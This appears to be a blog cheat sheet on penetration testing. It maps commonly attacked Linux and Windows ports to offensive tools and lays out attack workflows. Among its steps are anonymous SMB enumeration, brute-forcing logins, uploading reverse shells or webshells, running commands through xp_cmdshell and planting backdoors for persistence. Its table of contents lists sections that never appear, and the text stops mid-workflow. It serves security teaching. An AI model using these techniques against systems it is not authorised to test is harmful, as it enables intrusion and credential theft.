---
layout: post
title: "Pentesting Reference Guide"
date: 2025-03-30
categories: CheatSheets
---

# Penetration Testing Reference Guide

## Table of Contents

1. [Penetration Testing Reference Guide](#penetration-testing-reference-guide)
   - [Commonly Exploitable Ports and Services](#commonly-exploitable-ports-and-services)
     - [Linux (Common Ports & Services)](#linux-common-ports--services)
     - [Windows (Common Ports & Services)](#windows-common-ports--services)
   - [Toolset for Exploiting Each Service](#toolset-for-exploiting-each-service)
     - [SSH (Port 22)](#ssh-port-22)
     - [SMB / Windows Services (Ports 139/445, etc.)](#smb--windows-services-ports-139445-etc)
     - [RDP / Remote Desktop (Port 3389)](#rdp--remote-desktop-port-3389)
     - [Web Applications and Services (Ports 80, 443)](#web-applications-and-services-ports-80-443)
     - [Database Services (SQL Servers)](#database-services-sql-servers)
     - [Other Services and Tools](#other-services-and-tools)
   - [Pentesting Workflow](#pentesting-workflow)
     - [Workflow for Targeting Linux Systems](#workflow-for-targeting-linux-systems)
     - [Workflow for Targeting Windows Systems](#workflow-for-targeting-windows-systems)
   - [Privilege Escalation Techniques (Post-Exploitation)](#privilege-escalation-techniques-post-exploitation)
     - [Linux Privilege Escalation](#linux-privilege-escalation)
     - [Windows Privilege Escalation](#windows-privilege-escalation)
     - [Post-Exploitation Tools and Techniques](#post-exploitation-tools-and-techniques)
  - [Glossary](#glossary)  
    - [Burp Suite](#burp-suite)  
    - [Crowbar](#crowbar)  
    - [CrackMapExec](#crackmapexec)  
    - [Dirb](#dirb)  
    - [Enum4linux](#enum4linux)  
    - [FFUF](#ffuf)  
    - [Gobuster](#gobuster)  
    - [Hashcat](#hashcat)  
    - [Hydra](#hydra)  
    - [Impacket](#impacket)  
    - [John the Ripper](#john-the-ripper)  
    - [LinPEAS](#linpeas)  
    - [Medusa](#medusa)  
    - [Metasploit](#metasploit)  
    - [Mimikatz](#mimikatz)  
    - [Ncrack](#ncrack)  
    - [Nikto](#nikto)  
    - [Nmap](#nmap)  
    - [OWASP ZAP](#owasp-zap)  
    - [PowerUp](#powerup)  
    - [Responder](#responder)  
    - [Seatbelt](#seatbelt)  
    - [Socat](#socat)  
    - [Telnet](#telnet)  
    - [WinPEAS](#winpeas)  
    - [WPScan](#wpscan)  
    - [Xfreerdp / Rdesktop (RDP Clients)](#xfreerdp--rdesktop-rdp-clients)  
    - [ldapsearch](#ldapsearch)  
    - [mongo (MongoDB Client)](#mongo-mongodb-client)  
    - [onesixtyone](#onesixtyone)  
  - [Active Directory Enumeration & Attacks](#active-directory-enumeration--attacks)  
    - [PowerView / SharpView](#powerview--sharpview)  
    - [SharpHound](#sharphound)  
    - [BloodHound.py](#bloodhoundpy)  
    - [Kerbrute](#kerbrute)  
    - [Impacket Toolkit](#impacket-toolkit-selected)  
    - [Responder](#responder-1)  
    - [Inveigh / InveighZero](#inveigh--inveighzero)  
    - [rpcinfo / rpcclient](#rpcinfo--rpcclient)  
    - [CrackMapExec (CME)](#crackmapexec-cme)  
    - [NetExec](#netexec)  
    - [Rubeus](#rubeus)  
    - [GetUserSPNs.py](#getuserspnspy)  
    - [Hashcat](#hashcat-1)  
    - [enum4linux](#enum4linux-1)  
    - [enum4linux‑ng](#enum4linux‑ng)  
    - [windapsearch](#windapsearch)  
    - [DomainPasswordSpray.ps1](#domainpasswordsprayps1)  
    - [LAPSToolkit](#lapstoolkit)  
    - [smbmap](#smbmap)  
    - [evil‑winrm](#evil‑winrm)  
    - [Snaffler](#snaffler)  
    - [smbserver.py](#smbserverpy)  
    - [setspn.exe](#setspnexe)  
    - [PetitPotam.py](#petitpotampy)  
    - [noPac.py](#nopacpy)  
    - [adidnsdump](#adidnsdump)  
    - [gpp‑decrypt](#gpp‑decrypt)  
    - [ADExplorer (ADExplorer.exe)](#adexplorer-adexplorerexe)  
    - [PingCastle](#pingcastle)  
    - [Group3r](#group3r)  
    - [ADRecon](#adrecon)  

---

## Commonly Exploitable Ports and Services
Open ports indicate network services that might be entry points for attackers ([5 Essential Penetration Testing Phases You Can’t Ignore in 2025](https://www.eccouncil.org/cybersecurity-exchange/penetration-testing/penetration-testing-phases/#:~:text=Once%20all%20the%20relevant%20data,the%20next%20penetration%20testing%20phase)). Penetration testers focus on these commonly exploited services, which differ slightly between Linux and Windows environments. Below are well-known services, their default ports, and notes on why they are high-value targets:

### Linux (Common Ports & Services)
- **22 (SSH)** – Secure Shell for remote admin access. Often targeted via brute-force credential guessing or stolen SSH keys ([Identifying secure and unsecured ports and how to secure them - All About Security](https://www.all-about-security.de/identifying-secure-and-unsecured-ports-and-how-to-secure-them/#:~:text=)). Modern SSH versions are robust, but weak passwords or outdated versions can be exploited.
- **21 (FTP)** – File Transfer Protocol. Supports clear-text authentication; attackers may try anonymous login or brute-force credentials ([Identifying secure and unsecured ports and how to secure them - All About Security](https://www.all-about-security.de/identifying-secure-and-unsecured-ports-and-how-to-secure-them/#:~:text=,FTP)). Misconfigured FTP servers can allow unauthorized file uploads or downloads.
- **23 (Telnet)** – Unencrypted remote login (mostly replaced by SSH). Transmits data in plain text, making it susceptible to credential interception ([Identifying secure and unsecured ports and how to secure them - All About Security](https://www.all-about-security.de/identifying-secure-and-unsecured-ports-and-how-to-secure-them/#:~:text=)). If enabled, it’s vulnerable to brute-force attacks and should be disabled on modern systems.
- **25 (SMTP)** – Simple Mail Transfer Protocol for email. Not typically yielding remote shell access, but an open SMTP may allow spam relay or user enumeration via VRFY/EXPN commands. Weak configuration can be abused for phishing or as a pivot for social engineering.
- **53 (DNS)** – Domain Name System. UDP/TCP port for name resolution and zone transfers. Generally not a direct path to shell, but DNS cache poisoning or misconfigured zone transfers can leak internal network info. Also known to be abused in amplification DDoS attacks ([Identifying secure and unsecured ports and how to secure them - All About Security](https://www.all-about-security.de/identifying-secure-and-unsecured-ports-and-how-to-secure-them/#:~:text=)).
- **80/443 (HTTP/HTTPS)** – Web services. Extremely common attack surface since web apps often contain vulnerabilities (SQL injection, XSS, file inclusion, etc.) ([Identifying secure and unsecured ports and how to secure them - All About Security](https://www.all-about-security.de/identifying-secure-and-unsecured-ports-and-how-to-secure-them/#:~:text=,HTTP%20and%20HTTPS)). Insecure web applications (e.g. outdated CMS or frameworks) on these ports can lead to full server compromise.
- **3306 (MySQL)** – MySQL database service. If exposed with default or weak credentials, attackers can gain database access ([Identifying secure and unsecured ports and how to secure them - All About Security](https://www.all-about-security.de/identifying-secure-and-unsecured-ports-and-how-to-secure-them/#:~:text=,3306)). A compromised MySQL can allow reading sensitive data or even executing commands via functions or UDF exploits.
- **2049 (NFS)** – Network File System for Unix file sharing. Misconfigured NFS exports (e.g. world-readable or no root squash) can let attackers mount file shares and read/write sensitive files. This can lead to privilege escalation if system files are accessible.
- **161/162 (SNMP)** – Simple Network Management Protocol (UDP). Often left with default community string “public,” allowing read access to system info. Attackers use SNMP to gather network device info or even change configurations if write access is enabled.

### Windows (Common Ports & Services)
- **139/445 (SMB/CIFS)** – SMB file sharing and Windows domain services. Open by default on Windows and highly exploited ([How to detect and prevent a TCP 445 exploit and attack using firewall log analysis](https://www.manageengine.com/products/eventlog/logging-guide/firewall/how-to-detect-and-prevent-tcp-445-exploit-and-attack.html#:~:text=Port%20445%20was%20exploited%20in,banks%20and%20other%20public%20bodies)). SMBv1 vulnerabilities like **EternalBlue** (MS17-010) allow remote code execution ([Identifying secure and unsecured ports and how to secure them - All About Security](https://www.all-about-security.de/identifying-secure-and-unsecured-ports-and-how-to-secure-them/#:~:text=,SMB)), which was infamously used by WannaCry ransomware in 2017 ([How to detect and prevent a TCP 445 exploit and attack using firewall log analysis](https://www.manageengine.com/products/eventlog/logging-guide/firewall/how-to-detect-and-prevent-tcp-445-exploit-and-attack.html#:~:text=Port%20445%20was%20exploited%20in,banks%20and%20other%20public%20bodies)). Attackers also use SMB for tactics like NTLM hash capture (e.g. via SMB relay) and anonymous share access.
- **3389 (RDP)** – Remote Desktop Protocol for GUI access. Exposed RDP is often attacked via brute-force password guessing ([What Are Risky Ports?](https://forum.tufin.com/support/kc/securecloud/Content/SecureCloud/WhatIsRiskyPorts.htm#:~:text=obtain%20system%20information%20such%20as,trying%20username%20and%20password%20combinations)) or exploitation of RDP vulnerabilities (e.g. **BlueKeep** CVE-2019-0708 is a wormable RDP bug). An RDP service with weak or leaked credentials can quickly lead to full desktop control ([Identifying secure and unsecured ports and how to secure them - All About Security](https://www.all-about-security.de/identifying-secure-and-unsecured-ports-and-how-to-secure-them/#:~:text=)).
- **5985/5986 (WinRM)** – Windows Remote Management (HTTP/S). Allows PowerShell remoting. If an attacker obtains valid user credentials (or hashes), they can use WinRM to execute commands remotely (often used in lateral movement). Should be open only on trusted networks.
- **1433 (MSSQL)** – Microsoft SQL Server. Databases on this port are targeted if exposed. Attackers often try default `sa` credentials or exploit SQL Server misconfigurations to execute commands (xp_cmdshell) under the context of the DB service. Unprotected database ports are frequently probed to exploit them ([Identifying secure and unsecured ports and how to secure them - All About Security](https://www.all-about-security.de/identifying-secure-and-unsecured-ports-and-how-to-secure-them/#:~:text=,3306)).
- **389/636 (LDAP/LDAPS)** – Directory services (used by Active Directory). LDAP itself may allow enumeration of users and network structure if anonymous or weakly authenticated binds are allowed. While not typically exploited for remote code execution, information from LDAP can be leveraged for attacks like password spraying or privilege escalation in a domain.
- **135 (RPC)** – Microsoft RPC Endpoint Mapper. Used to negotiate DCE/RPC communications (e.g. DCOM, WMI). Historically associated with vulnerabilities like MS08-067 (Conficker) which exploited the RPC service on Windows XP/2003. Modern Windows RPC issues are less common, but the service is essential for many Windows functions and often a pivot for attacks (e.g. lateral movement using WMI).
- **53 (DNS)** – Windows DNS Server if running. Like on Linux, an insecurely configured DNS on a domain controller could allow zone transfers, leaking internal records. Also, past RCE vulnerabilities in Microsoft DNS (e.g. SIGRed CVE-2020-1350) make this a notable port on Windows servers.

*(Both Linux and Windows may run additional services; the above are those frequently seen in penetration testing engagements. Ensuring these services are patched, properly configured, and firewalled is crucial to securing a system.)*

## Toolset for Exploiting Each Service
Open-source tools are the backbone of a pentester’s arsenal, used for everything from initial enumeration to final exploitation. A typical workflow might use scanners like **Nmap** to map open ports and identify service versions ([5 Essential Penetration Testing Phases You Can’t Ignore in 2025](https://www.eccouncil.org/cybersecurity-exchange/penetration-testing/penetration-testing-phases/#:~:text=,features%20for%20identifying%20vulnerable%20applications)), then specialized tools or frameworks (e.g. **Metasploit** for known exploits ([5 Essential Penetration Testing Phases You Can’t Ignore in 2025](https://www.eccouncil.org/cybersecurity-exchange/penetration-testing/penetration-testing-phases/#:~:text=,features%20for%20identifying%20vulnerable%20applications))) to actually compromise the service. Below is a breakdown of tools per service type:

### SSH (Port 22)
- **Nmap** – Used to detect SSH service and version (e.g. `nmap -sV -p22 --script ssh2-enum-algos` to enumerate supported algorithms). Nmap’s SSH scripts help identify weak ciphers or default credentials.
- **Hydra/Medusa** – Password brute-force tools for SSH. These attempt many username/password combinations to find weak logins ([Hydra - Hackviser](https://hackviser.com/tactics/tools/hydra#:~:text=Hydra%20is%20an%20open,to%20test%20the%20authentication%20mechanisms)). For example, Hydra can test a list of passwords against an SSH server in parallel.
- **SSH client / Banner grabbing** – Using `ssh` itself or tools like `netcat` to grab the SSH banner (which often reveals the SSH version) can inform whether the server is outdated. This is useful for checking if known vulnerabilities (like CVE-2018-10933 in libSSH) apply.
- **ssh-audit** – A specialized tool to audit SSH server configuration (supported ciphers, MACs, etc.), looking for weak settings.
- **Metasploit modules** – Metasploit includes modules for brute forcing SSH or exploiting specific older vulnerabilities (though modern SSH has few public RCEs). For instance, `auxiliary/scanner/ssh/ssh_login` in Metasploit can automate credential guessing.
- **John the Ripper** – If an SSH key is obtained (e.g. from another system or loot), John can crack passphrase-protected SSH private keys ([John the Ripper - Hackviser](https://hackviser.com/tactics/tools/john-the-ripper#:~:text=John%20the%20Ripper%20is%20an,available%20for%20many%20operating%20systems)) or hashed passwords from `/etc/shadow` once you have shell access. This helps in moving laterally or escalating privileges by recovering credentials.

### SMB / Windows Services (Ports 139/445, etc.)
- **Nmap SMB scripts** – Nmap has extensive SMB NSE scripts. For example, `--script smb-enum-shares,smb-enum-users` will enumerate shares and users, and `smb-vuln*` scripts check for known vulnerabilities (like MS17-010) ([SMB Enumeration Cheatsheet - 0xdf hacks stuff](https://0xdf.gitlab.io/cheatsheets/smb-enum#:~:text=%2A%20Check%20for%20Vulnerabilities%20,p%20139%2C445%20%5Bip)) ([SMB Enumeration Cheatsheet - 0xdf hacks stuff](https://0xdf.gitlab.io/cheatsheets/smb-enum#:~:text=%2A%20Install%20with%20%60pipx%60%20,apt%20install%20nmap)).
- **Enum4linux** – A classic Linux tool to enumerate Windows/SMB information. It can pull user lists, share names, and policy info from Windows machines via SMB/RPC (using null sessions or given credentials).
- **SMBMap** – Used to enumerate SMB shares and their permissions in a convenient way. For example, it shows which shares are writeable or accessible with given creds or anonymously.
- **CrackMapExec (CME)** – A multipurpose tool (now `netexec`) that automates SMB enumeration and attack. It can test a set of credentials or hashes across many machines at once ([SMB Enumeration Cheatsheet - 0xdf hacks stuff](https://0xdf.gitlab.io/cheatsheets/smb-enum#:~:text=,Linux%20SMB%20client)), attempt directory traversal attacks on SMB shares, and even run commands via SMB sessions. This is extremely useful for lateral movement in Windows networks.
- **Impacket suite** – Impacket provides Python tools/scripts for various protocols. For SMB, tools like `smbclient.py`, `lookupsids.py` and `samrdump.py` allow enumerating shares, RID brute forcing, and dumping SAM user hashes ([SMB Enumeration Cheatsheet - 0xdf hacks stuff](https://0xdf.gitlab.io/cheatsheets/smb-enum#:~:text=,%60nmap)). Impacket’s `psexec.py` and `wmiexec.py` allow executing commands on a remote SMB server (given credentials or captured hashes), simulating what a Windows admin tool would do.
- **Metasploit** – Contains many SMB exploitation modules. Notably, `exploit/windows/smb/ms17_010_eternalblue` for EternalBlue, or modules for MS08-067, etc. Metasploit also has an SMB login scanner and can leverage credentials to open a session. After exploitation, Metasploit’s post modules (like hashdump) can be used for credential theft.
- **Responder** – (For internal network attacks) Responder listens for NetBIOS/LLMNR broadcasts to trick machines into authenticating and capture their NTLM hashes. While not directly “exploiting SMB service,” it’s a tool leveraging name resolution to grab SMB credentials in a Windows network.
- **PowerShell** – On Windows targets, PowerShell remoting (WinRM) or WMI can be used with tools like PowerShell Empire or Impacket’s `wmiexec` as noted. These allow executing commands through SMB/WinRM services if credentials are obtained.

### RDP / Remote Desktop (Port 3389)
- **Nmap** – Nmap can check if RDP is available and even run scripts like `rdp-enum-encryption` to see if Network Level Authentication (NLA) is required. It also has an `rdp-vuln-ms12-020` script to test for an old DoS vulnerability.
- **Hydra/Ncrack** – These support RDP brute-force attacks, trying common usernames and passwords on the Remote Desktop service. A successful guess could grant full GUI access. (Note: account lockout policies often limit brute-force effectiveness on RDP.)
- **Metasploit (BlueKeep)** – Metasploit has a module for CVE-2019-0708 (BlueKeep) which can exploit unpatched Windows 7/2008 RDP to execute code. Other RDP exploits are rare, but BlueKeep was significant. Metasploit can also perform a protocol scan (`auxiliary/scanner/rdp/rdp_scanner`) to identify RDP and check for NLA.
- **RDP Clients** – Tools like `xfreerdp` or `rdesktop` are used to connect to RDP once credentials are known. From a penetration perspective, after obtaining credentials, these tools let you log in to the remote desktop for further manual exploitation.
- **Crowbar** – A tool that can brute-force RDP (and other services like VNC, SSH) by using a list of passwords. Useful as an alternative to Hydra specifically for RDP where NLA might complicate pure socket tools.

### Web Applications and Services (Ports 80, 443)
- **Nmap HTTP scripts** – Nmap’s HTTP scripts (e.g. `http-title`, `http-server-header`, `http-vuln-*`) gather initial info about web services. Nmap can quickly flag if a server is running Apache, IIS, nginx, etc., and even test for some vulnerabilities.
- **WhatWeb / Wappalyzer** – Technologies fingerprinting tools. They identify frameworks or CMS in use (WordPress, Joomla, Apache Struts, etc.) which helps in focusing the attack (for instance, noticing a WordPress site so you can run WPScan).
- **FFUF / Gobuster** – Web fuzzers for content discovery. They brute-force common directory and file names to find hidden pages, admin panels, backups, etc. FFUF (Fuzz Faster U Fool) is an extremely fast and flexible web fuzzer for discovering hidden files and directories ([FFUF - Hackviser](https://hackviser.com/tactics/tools/ffuf#:~:text=FFUF%20,force%20techniques)). Gobuster serves a similar purpose using wordlists to enumerate URLs.
- **Nikto** – A free web server scanner that looks for over 6000 common vulnerabilities or misconfigurations. It checks for default files, outdated server versions, and other known issues. Good for a quick coverage of low-hanging fruits on web services.
- **Burp Suite (Community Edition)** – An all-in-one web application security testing tool ([5 Essential Penetration Testing Phases You Can’t Ignore in 2025](https://www.eccouncil.org/cybersecurity-exchange/penetration-testing/penetration-testing-phases/#:~:text=,between%20the%20client%20and%20server)). Burp’s proxy allows intercepting and modifying HTTP requests/responses. Even the free version includes an intruder for fuzzing parameters, a repeater for manual testing of requests, and a scanner (limited in the free edition) to find issues like SQLi or XSS. This is a primary tool for any web exploitation workflow.
- **OWASP ZAP** – An open-source alternative to Burp, useful for automated scanning and manual testing. It can perform active scans to discover common webapp vulnerabilities and has a proxy for intercepting traffic.
- **SQLMap** – An automated SQL injection exploitation tool. Given a URL and parameters, it will attempt to find SQL injection vulnerabilities and can dump databases, read files, or even get OS shell if the DB server has such access. Very effective for exploiting web parameters tied to SQL databases.
- **WFuzz/Dirb** – Other web content discovery and fuzzing tools. For example, Dirb is a simple directory buster, and Wfuzz can fuzz parameters (for blind SQLi, XSS, etc.) systematically.
- **WPScan** – A scanner specifically for WordPress sites. It enumerates plugins, themes, and users, and checks against a database of known WordPress vulnerabilities ([WPScan - Hackviser](https://hackviser.com/tactics/tools/wpcan#:~:text=WPScan%20is%20not%20an%20open,generally%20applied%20themes%20and%20plugins)) ([WPScan - Hackviser](https://hackviser.com/tactics/tools/wpcan#:~:text=,WordPress%20core%2C%20plugins%2C%20and%20themes)). It can also perform brute-force login guessing. This tool is essential when attacking a WordPress-driven site since vulnerable plugins or weak admin passwords are common attack vectors.

### Database Services (SQL Servers)
- **Nmap** – Database-specific scripts exist (e.g., `mysql-info`, `ms-sql-empty-password`, `postgresql-brute`). Nmap can enumerate database versions and attempt basic credential checks or vuln probes (like for MongoDB open access, etc.).
- **MySQL Client & Tools** – The native MySQL command-line client can be used to test connections (e.g., `mysql -u root -p` with no password, or test common creds). There are also tools like `mysqlenum` for pulling version and configuration info. Once inside a MySQL database, an attacker might use SQL queries to read sensitive data or even escalate (for example, use `SELECT INTO OUTFILE` to drop a webshell on a web server, or use UDF exploitation to get a shell).
- **MSSQL Tools** – `sqsh` or Microsoft’s OSQL/SQLCMD (on Windows) can connect to Microsoft SQL Server. With credentials, a penetration tester can enable the `xp_cmdshell` stored procedure to execute system commands. There are Metasploit modules (`mssql_login`, `mssql_exec`) to automate this: for instance, `auxiliary/admin/mssql/mssql_exec` can run a command on the OS via an SQL query if the account has proper privileges.
- **Impacket mssqlclient.py** – Part of Impacket, this tool allows direct MS-SQL queries and can even perform Windows authentication if integrated. It’s useful for executing commands via `xp_cmdshell` and retrieving the output.
- **SQLMap** – Although primarily a web tool, SQLMap can target database servers directly if given the connection details. It’s less common to use it this way, but it can fuzz and exploit procedures in SQL servers as well.
- **MongoDB/NoSQL tools** – For NoSQL databases, one might use tools like `mongo client` or specific scripts to check for default admin access on Mongo (which historically had no auth by default in older versions). Similarly, Redis (6379) can be tested by redis-cli for insecure default access (e.g., writing an SSH key to authorized_keys file).
- **Brute-force tools** – Hydra and Medusa also support database protocols (MySQL, PostgreSQL, MSSQL). Using these, testers attempt common username/password combos (e.g., `sa` with no password on MSSQL, or `root`/`toor` on MySQL) to gain access ([Hydra - Hackviser](https://hackviser.com/tactics/tools/hydra#:~:text=%2A%20Brute,login%20credentials%20containing%20weak%20passwords)). 

### Other Services and Tools
- **FTP (21)** – Use an FTP client (`ftp` command or tools like `ncftp`) to check for anonymous login or weak credentials. Nmap’s `ftp-anon` script quickly checks if anonymous FTP is allowed and lists files. Hydra can brute-force FTP logins as well.
- **Telnet (23)** – Basic telnet clients can be used to connect and test login prompts (if any). Hydra can brute-force telnet passwords too. Telnet is simple, so often exploitation is just logging in with default or guessed creds if it’s open.
- **SNMP (161)** – Tools like `snmpwalk` can enumerate SNMP info using the public community string. Ones like `onesixtyone` can brute-force community names. If SNMP is read-write (rare), it could be exploited to change device settings. SNMP data (like running processes, open TCP ports on a host, etc.) can greatly assist in mapping a target.
- **LDAP (389)** – `ldapsearch` can be used for querying LDAP directories. If anonymous bind is allowed on an Active Directory, for example, `ldapsearch` can pull a list of users or other AD information. This isn’t a direct exploit, but it provides intel for attacks (e.g. user lists for password spraying).
- **Port Forwarding / Tunneling Tools** – Not a specific service exploit, but tools like `SSH port forwarding`, `socat`, or `chisel` are used to pivot into internal services once an initial foothold is established. For instance, if a database port is not accessible externally, a pentester who has a shell on the web server might port-forward to reach the internal database.
- **John the Ripper / Hashcat** – After obtaining password hashes (from /etc/shadow, Windows SAM, or dumped from an SMB service using `secretsdump`), these cracking tools are used. John the Ripper is a CPU-based cracker good for common hash types ([John the Ripper - Hackviser](https://hackviser.com/tactics/tools/john-the-ripper#:~:text=John%20the%20Ripper%20is%20an,available%20for%20many%20operating%20systems)), while Hashcat leverages GPU for faster cracking. These tools help in recovering plaintext passwords, which might be reused on other services, enabling further exploitation.
- **Metasploit & Post Exploitation** – Many tools overlap phases. Metasploit, for example, isn’t only for exploitation; it also has **post-exploitation modules** that dump credentials, scan the internal network from a compromised host, or pivot sessions. Similarly, **Impacket** tools can be used post-exploit (e.g., `mimikatz` via Impacket’s toolkit to dump Windows credentials). 

*(Choosing the right tool for each service comes with experience. Seasoned testers combine these tools – for example, using Nmap results to decide to run WPScan on a WordPress site, or using CrackMapExec with credentials found by John the Ripper. Open-source tools provide the flexibility to script and automate these actions, which is essential for efficient testing.)*

## Pentesting Workflow
A structured penetration testing workflow ensures no step is overlooked – from initial reconnaissance through exploitation and post-exploitation. Formal methodologies break the process into phases such as reconnaissance, scanning, enumeration, exploitation, and reporting ([5 Essential Penetration Testing Phases You Can’t Ignore in 2025](https://www.eccouncil.org/cybersecurity-exchange/penetration-testing/penetration-testing-phases/#:~:text=The%20Five%20Phases%20of%20Penetration,Testing)). In practice, these phases overlap, and testers iterate as new information is found. Below, we outline typical workflows for targeting Linux and Windows systems, highlighting how enumeration informs the exploitation strategy (for example, a web server vs. an SMB service will lead down different exploit paths). Importantly, thorough enumeration is critical – attempting exploits too early can be a mistake ([5 Essential Penetration Testing Phases You Can’t Ignore in 2025](https://www.eccouncil.org/cybersecurity-exchange/penetration-testing/penetration-testing-phases/#:~:text=,perform%20a%20useful%20penetration%20test)) if you haven’t uncovered weak points. The workflows are:

### Workflow for Targeting Linux Systems
1. **Initial Reconnaissance & Scanning** – Gather information about the target network or host. Use tools like Nmap for port scanning to identify open ports/services on the Linux host (e.g., SSH, HTTP, FTP, etc.). For example, if port 80 is open, note that we have a web service; if 2049 is open, an NFS service is present. Also perform service version detection (`-sV`) to find software versions (Apache, OpenSSH, etc.) which might have known vulnerabilities.
2. **Service Enumeration** – For each open port, perform targeted enumeration:
   - If a web service (80/443) is found, browse the site and use tools like Gobuster/FFUF to find hidden paths, and WhatWeb/Wappalyzer to identify technologies. You might discover, say, a WordPress site (suggesting the use of WPScan next) or an out-of-date Apache server banner.
   - If SSH (22) is open, attempt to grab the SSH version (`ssh -v` or Nmap script). A legacy SSH version could hint at known flaws, though those are rare. More likely, you’ll consider brute-force or public key attacks if credentials can be obtained.
   - If an FTP server (21) allows anonymous login, enumerate accessible files (they might contain credentials or secrets). If it requires login, test common creds or use Hydra if appropriate and account lockout isn’t a concern.
   - For database ports (e.g., MySQL 3306), try default creds and perform basic SQL queries if possible (or use a tool like mysqlenum).
   - Enumerate any RPC or NFS services (showmount for NFS to list exports, rpcinfo for RPC services).
   - Essentially, at this stage gather **as much info as possible**: user lists, share names, software versions, configuration details. This enumeration directly informs the next step.
3. **Vulnerability Analysis** – Map the enumeration results to known vulnerabilities or weaknesses. This is where experience and research come in:
   - Check software versions against exploit databases (for instance, if Nmap found vsftpd 2.3.4 on FTP, that version has a known backdoor exploit; if Apache Tomcat is running, does it have default credentials on the manager interface?).
   - Identify misconfigurations: e.g., an NFS share exportable to everyone with no root squash (potential to create SUID binaries to escalate later), or a web upload functionality that might allow malicious files.
   - Use search engines and databases (Exploit-DB, CVE lists) to find exploits for identified software. Tools like Searchsploit (built into Kali) can be used: *e.g.*, `searchsploit proftpd 1.3.5` if that FTP version was found.
   - Prioritize vulnerabilities by ease and impact. For example, an open phpMyAdmin portal with default creds is a quick win for full DB access, whereas an obscure buffer overflow in a service might require more effort.
   - Also assess passwords found or brute-forced in enumeration. A reused or weak password (for SSH, FTP, etc.) can be a direct path in.
4. **Exploitation** – Now attempt to exploit the identified weaknesses to gain a foothold on the system. The approach will differ based on what you found:
   - **Web Exploitation**: If the website has an apparent vulnerability (say, an **SQL injection** in a login form or a known exploit in an outdated WordPress plugin), use that to dump data or get a shell. For instance, an SQL injection might allow reading `/etc/passwd` or writing a webshell file. If a file upload is allowed (and not properly secured), upload a PHP reverse shell and execute it by visiting the file to spawn a shell on the server.
   - **Service Exploitation**: Launch exploits against services with known flaws. If an older OpenSSH was found vulnerable to a specific CVE, use the exploit (or Metasploit module) for that CVE. If an FTP service allows file upload to the web directory, leverage that (as was done in some CTF-like scenarios such as uploading PHP through FTP and then triggering it via web).
   - **Password Reuse / Credential Login**: Use any cracked or guessed credentials to log into services. For example, if you cracked an SSH password or found credentials in a config file during enumeration, attempt SSH login to gain a shell.
   - **Leverage Trust Relationships**: Sometimes exploitation on Linux is about abusing trust – e.g., if there’s NFS with no_root_squash, you could create a setuid root shell on the NFS share and execute it on the target to become root (which is a form of exploitation/post-exploitation combined).
   - It’s common to use **Metasploit** at this stage for reliability. For instance, to exploit a Linux Samba service (SMB on Linux) that’s vulnerable to SambaCry (CVE-2017-7494), or to exploit a Linux kernel vulnerability via a Metasploit local exploit module once you have user access. Always double-check exploit settings (RHOST, LHOST, payload, etc.) and have a stable listener (e.g., using `netcat` or Metasploit’s multi/handler) ready to catch shells.
5. **Post-Exploitation & Privilege Escalation** – After initial access (typically as a normal user on the Linux system), enumerate the system internals. Run `hostname`, `id`, and gather system info. Then proceed to privilege escalation (detailed in a later section) to gain root access. On Linux, this might involve checking for vulnerable kernel version, misconfigured sudo, or readable sensitive files like SSH private keys. Tools like `linpeas.sh` can automate this enumeration. For example, if you find that the target is running an outdated kernel with a known local exploit, you can compile and run that exploit to become root. Or if you discover a cron job running as root that executes a script in a world-writable directory, you can plant malicious code there (this is an exploitation of misconfiguration).
   - Additionally, secure a foothold: consider installing a persistent backdoor or creating a new user with a known password for later access (in a real engagement, this step is taken with caution and normally removed in cleanup). In a CTF scenario, this might not be necessary; in a red-team, establishing persistence is key.
   - Begin lateral movement if required: use the compromised machine to pivot deeper into the network. For instance, if this Linux host was a web server in a DMZ, from it you might port-forward or pivot to reach an internal database server not directly accessible before.

*(Throughout the process, maintain good notes. Each finding from enumeration should trace to an exploit attempt. If something doesn’t work, revisit the enumeration—perhaps there was a subtle clue missed. For Linux targets, always remember to try simple things too, like default credentials or common passwords, as these often yield results even on “hardened” systems.)*

### Workflow for Targeting Windows Systems
1. **Initial Reconnaissance & Scanning** – Use Nmap or other scanners to identify Windows hosts and open ports. Windows machines can often be recognized by ports like 445/139 (SMB), 3389 (RDP), 135 (RPC). Service detection will show if it’s running Windows RPC, Microsoft IIS (web server), MS SQL, etc. Note the hostnames if obtained (e.g., through NetBIOS or reverse DNS lookup), as they might indicate the role of the server (e.g., a host named `DC01` is likely a domain controller, which will guide your approach differently than a standalone server).
2. **Service Enumeration** – Enumerate each service in depth, leveraging Windows-specific enumeration tools:
   - **SMB/NetBIOS**: Try to gather as much info as possible from SMB. Use `null` session if permitted (e.g., `smbclient -L //target/ip -N` to list shares anonymously). Use tools like Enum4linux or CrackMapExec to list users, shares, and policies ([SMB Enumeration Cheatsheet - 0xdf hacks stuff](https://0xdf.gitlab.io/cheatsheets/smb-enum#:~:text=Other%20Tools)). For domain environments, use `rpcclient` or specialized scripts to enumerate domain info (users, groups). Also, check SMB signing requirement (lack of signing can enable relay attacks, though that’s a more advanced technique).
   - **Active Directory**: If the target is in a domain and you have a foothold or credentials, use AD enumeration tools (e.g., `ldapsearch`, PowerView, or BloodHound data collection via Sharphound) to map the domain. Even without creds, some AD info might be gleaned via LDAP if anonymous binds are allowed (rare on modern configs). At this stage, also note domain security features: is LAPS in use (unique local admin passwords) or older vulnerabilities like password in GPP (Group Policy Preferences) present? Such observations come from enumeration.
   - **RDP**: Check if Network Level Authentication (NLA) is required (Nmap’s `rdp-enum-encryption` can tell you). If NLA is off and you have a credential, you might attempt an RDP login. If no credential, note RDP for potential brute force or as a target for exploits like BlueKeep. Also consider safe brute-force via Hydra/Medusa if policy allows (but many RDP services lock accounts or have few attempts allowed).
   - **Web (IIS)**: If the Windows host has a web service (IIS on port 80/443), enumerate it like any web app (using Burp, Nikto, etc.). Check for ASP.NET applications, older ASP pages, or default IIS pages. Known issues might include outdated ASP.NET frameworks (leading to deserialization attacks) or misconfigured web.config files leaking info.
   - **Database Services**: For MSSQL (1433), attempt to connect using a SQL client or Nmap scripts. Default `SA` with no password was common on old setups. If you have Windows credentials from another source, try them for SQL authentication as well (sometimes Windows domain creds double as SQL login via integrated auth).
   - **WinRM/PowerShell**: If 5985 is open (WinRM), and if you discover any user credentials, you can use them with Evil-WinRM or Enter-PSSession (PowerShell) to get a shell. At this stage, you’re just noting that WinRM is open and viable if creds are obtained.
   - **SNMP**: On Windows, SNMP can reveal usernames, running software, etc. Use snmpwalk if SNMP is open. Similarly, enumerate RPC (using rpcclient or `srvinfo` commands) to get OS version, etc.
